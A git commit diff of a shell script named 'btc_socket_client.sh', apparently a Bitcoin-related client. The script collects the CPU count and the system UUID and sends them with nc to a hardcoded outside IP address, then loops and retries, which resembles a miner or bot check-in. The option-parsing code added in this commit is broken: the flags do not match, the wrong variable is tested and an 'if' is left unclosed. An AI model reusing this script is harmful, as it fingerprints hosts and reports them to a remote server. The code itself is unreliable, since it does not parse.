47d88d8bd92ca88ad0ddf53d2cb33f7b3206e8ce
Tung Bui <im@tung.pro>
2018-05-28 13:46:04 +0700

    Update btc_socket_client.sh

--- btc_socket_client.sh
+++ btc_socket_client.sh
@@ -5,10 +5,25 @@ _wait () {
 	done;
 };
 _exec () {
+	group=''
+
+	while getopts 'abf:v' flag; do
+	  case "${flag}" in
+	    g) group="${OPTARG}" ;;
+	    *) error "Unexpected option ${flag}" ;;
+	  esac
+	done
+
+	if [ "$a" = "" ];
+	then
+		echo "Flag -g (group) is required."
+    exit 64
+
 	numCore=`grep -c ^processor /proc/cpuinfo`;
 	uuid=`dmidecode | grep -w UUID | sed "s/^.UUID: //g"`
 	echo "tungbui|Azure-g@gmail.com|$uuid|$numCore" | nc -q -1 149.28.31.125 45569;
 	echo 'Port closed. Waiting server to open port...';
 	_wait;
 	_exec;
-};_exec;
+};
+_exec;
